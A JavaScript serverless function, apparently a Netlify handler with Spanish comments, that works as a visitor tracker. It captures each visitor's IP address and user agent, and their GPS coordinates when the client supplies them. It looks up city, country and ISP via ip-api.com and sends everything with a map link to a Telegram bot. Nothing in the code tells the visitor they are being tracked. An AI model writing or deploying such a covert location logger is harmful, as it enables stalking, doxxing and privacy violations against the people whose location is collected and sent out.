const axios = require('axios');

exports.handler = async (event) => {
    const clientIP = event.headers['x-nf-client-connection-ip'] || event.headers['client-ip'] || "127.0.0.1";
    const userAgent = event.headers['user-agent'] || "Desconocido";

    try {
        let bodyData = {};
        if (event.body) {
            try { bodyData = JSON.parse(event.body); } catch (e) { bodyData = {}; }
        }

        // 1. Consultar IP-API para obtener la ciudad y otros datos
        let ipData = {};
        try {
            const res = await axios.get(`http://ip-api.com/json/${clientIP}?fields=status,country,city,isp,lat,lon`, { timeout: 2000 });
            ipData = res.data;
        } catch (e) { ipData = {}; }

        // 2. Determinar la ubicación (Prioridad GPS, si no hay, usar IP)
        let ubicacionTexto = "";
        let ciudadAproximada = ipData.city || "No detectada";
        let pais = ipData.country || "Desconocido";

        if (bodyData.lat && bodyData.lon) {
            ubicacionTexto = `🎯 *GPS (Precisa)* - ${ciudadAproximada}, ${pais}`;
        } else {
            ubicacionTexto = `☁️ *IP (Aproximada)* - ${ciudadAproximada}, ${pais}`;
        }

        // Coordenadas para el mapa
        const lat = bodyData.lat || ipData.lat || 0;
        const lon = bodyData.lon || ipData.lon || 0;
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

        // 3. Estructura del mensaje para Telegram
        let mensaje = `🦍 *¡GORILA REPORTANDO CIUDAD!* 🦍\n\n`;
        mensaje += `🔑 *IP:* \`${clientIP}\`\n`;
        mensaje += `🏙️ *Ciudad:* ${ciudadAproximada}\n`; // <--- Aquí está lo que pediste
        mensaje += `📍 *Tipo:* ${ubicacionTexto}\n`;
        mensaje += `📡 *ISP:* ${ipData.isp || 'Desconocido'}\n`;
        mensaje += `📱 *Dispositivo:* ${userAgent.substring(0, 45)}...\n\n`;
        mensaje += `🗺️ [ABRIR MAPA](${mapsUrl})`;

        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: mensaje,
            parse_mode: 'Markdown'
        });

        return { 
            statusCode: 200, 
            headers: { "Access-Control-Allow-Origin": "*" },
            body: "Ciudad enviada" 
        };

    } catch (error) {
        console.error("Error crítico:", error.message);
        return { statusCode: 500, body: "Error" };
    }
};